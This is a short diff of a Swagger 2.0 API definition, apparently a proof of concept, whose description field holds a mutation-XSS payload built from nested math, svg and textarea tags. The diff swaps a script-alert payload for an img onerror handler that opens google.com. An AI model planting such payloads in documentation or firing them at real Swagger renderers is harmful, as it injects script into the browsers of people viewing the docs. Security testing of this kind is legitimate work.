@@ -2,8 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script>alert(1)</script>">
-
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='window.open("https://www.google.com")'>">
+    
   version: production
 basePath: /JSSResource/
 produces:
